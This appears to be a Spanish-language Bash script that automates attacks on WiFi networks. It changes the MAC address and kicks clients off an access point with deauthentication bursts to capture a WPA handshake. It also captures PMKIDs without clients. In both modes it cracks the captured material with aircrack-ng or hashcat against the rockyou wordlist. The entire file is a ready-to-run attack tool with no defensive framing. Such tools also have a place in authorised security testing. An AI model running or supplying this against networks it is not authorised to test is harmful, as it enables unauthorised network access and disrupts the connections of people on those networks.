#!/bin/bash

# Author: rxshs3c


#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){

  echo -e "${yellowColour}[!]${endColour}${grayColour}Saliendo...${endColour}"
  tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
  rm Captura* 2>/dev/null
  exit 0

}

function dependencies(){
  
  tput civis
  clear; dependencies=(aircrack-ng macchanger)
  
  echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"

  for program in "${dependencies[@]}"; do
    echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta ${endColour}${purpleColour}$program${endColour}${blueColour}...${endColour}"
    
    test -f /usr/bin/$program 
    
    if [ "$(echo $?)" == "0" ];then
      echo -e "${greenColour} (V)${endColour}"
    else
      echo -e "${redColour} (X)${endColour}\n"
      echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
      apt-get install $program -y > /dev/null 2>&1
    fi; sleep 1
  done

}

function helpPanel(){

  echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./rxshPwnWfi.sh${endColour}"
  echo -e "\t${purpleColour}a)${endColour}${yellowColour} Modo de ataque${endColour}"
  echo -e "\t\t${redColour}Handshake${endColour}"
  echo -e "\t\t${redColour}PKMID${endColour}\n"
  echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
  echo -e "\t${purpleColour}h)${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}" 
  exit 0

}

function startAttack(){
  clear 
  echo -e "${yellowColour}[*]${grayColour} Configurando tarjeta de red... ${endColour}"
  airmon-ng start $networkCard > /dev/null 2>&1
  ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
  ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null
  echo -e "\n${yellowColour}[*]${endColour}${grayColour} Nueva direccion MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"


  if [ "$(echo $attack_mode)" == "Handshake" ]; then

    xterm -hold -e "airodump-ng ${networkCard}mon" &
    airodump_xterm_PID=$!

    echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso (ESSID): ${endColour}" && read apName
    echo -ne "\n${yellowColour}[*]${endColour}${grayColour} MAC del punto de acceso (BSSID): ${endColour}" && read apBssid
    echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso (Channel): ${endColour}" && read apChannel
    
    kill -9 $airodump_xterm_PID 2>/dev/null
    wait $airodump_xterm_PID 2>/dev/null
    
    iwconfig ${networkCard}mon channel $apChannel 2>/dev/null

    rm Captura-01* 2>/dev/null

    xterm -e "airodump-ng -c $apChannel --bssid $apBssid -w Captura ${networkCard}mon" &
    airodump_filter_xterm_PID=$!

    sleep 3

    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Enviando ráfaga de desautenticación...${endColour}"
    aireplay-ng -0 15 -a $apBssid ${networkCard}mon
    
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando 15 segundos para asegurar la captura del Handshake...${endColour}"
    sleep 15

    kill -9 $airodump_filter_xterm_PID 2>/dev/null
    wait $airodump_filter_xterm_PID 2>/dev/null

    if [ -f "Captura-01.cap" ]; then
      echo -e "\n${greenColour}[+]${endColour}${grayColour} ¡Handshake guardado en Captura-01.cap! Iniciando Aircrack-ng...${endColour}\n"
      sleep 2
      aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap
    else
      echo -e "\n${redColour}[!] Error: No se encontró el archivo Captura-01.cap${endColour}\n"
    fi

  elif [ "$(echo $attack_mode)" == "PKMID" ]; then
    clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
    timeout 20 bash -c "hcxdumptool -i ${networkCard}mon -w Captura.pcapng"   
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
    sleep 2
    hcxpcapngtool -o myHashes Captura.pcapng; rm Captura.pcapng 

    test -f myHashes

    if [ "$(echo $?)" == "0" ]; then
      echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
      hashcat -m 22000 myHashes /usr/share/wordlists/rockyou.txt --force
    else 
      echo -e "\n${redColour}[!] No se ha podido capturar el paquete necesario...${endColour}\n"
    fi 
  else
    echo -e "\n${redColour}[*] Este modo de ataque no es valido ${endColour}\n"
  fi

}
 
# Main Function
if [ "$(id -u)" == "0" ]; then
  declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
    case $arg in 
      a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
      n) networkCard=$OPTARG; let parameter_counter+=1 ;;
      h) helpPanel;;
    esac
  done

  if [ $parameter_counter -ne 2 ]; then
    helpPanel
  else
    dependencies 
    startAttack
    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
  fi
else
  echo -e "\n${redColour}[!] No soy root${endColour}"
fi
